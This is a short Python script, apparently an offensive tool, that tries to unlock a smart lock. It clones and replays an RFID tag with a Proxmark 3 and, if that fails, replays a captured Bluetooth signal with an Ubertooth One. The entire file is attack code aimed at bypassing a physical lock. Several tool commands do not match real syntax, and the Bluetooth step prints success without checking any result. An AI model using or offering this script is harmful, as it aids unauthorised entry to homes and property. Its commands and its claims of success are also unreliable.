import subprocess
import time

# Function to attempt RFID exploit using Proxmark 3
def exploit_rfid():
    """
    Attempts to exploit the RFID system of the smart lock using Proxmark 3.
    """
    print("[+] Attempting RFID exploit...")
    result = subprocess.run(["proxmark3", "hf", "search"], capture_output=True)
    if result.returncode == 0:
        print("[✔] RFID system detected.")
        subprocess.run(["proxmark3", "hf", "dump"])  # Capture RFID tag
        subprocess.run(["proxmark3", "hf", "emulate"])  # Replay RFID tag to unlock
        return True
    else:
        print("[!] RFID exploit failed.")
        return False

# Function to attempt Bluetooth exploit using Ubertooth One
def exploit_bluetooth():
    """
    Attempts to exploit the Bluetooth system of the smart lock using Ubertooth One.
    """
    print("[+] Attempting Bluetooth exploit...")
    subprocess.run(["ubertooth-btle", "sniff", "-f", "bluetooth_lock_signal.dat"])  # Capture Bluetooth signal
    subprocess.run(["ubertooth-btle", "replay", "bluetooth_lock_signal.dat"])  # Replay Bluetooth signal to unlock
    print("[✔] Bluetooth system exploited successfully.")

# Main function to run escalating exploits
def multi_tool_escalating_exploit():
    """
    Attempts to exploit the smart lock using RFID first, and escalates to Bluetooth if RFID fails.
    """
    if not exploit_rfid():
        print("[+] Escalating to Bluetooth attack...")
        exploit_bluetooth()

# Run the escalating exploit
if __name__ == "__main__":
    multi_tool_escalating_exploit()
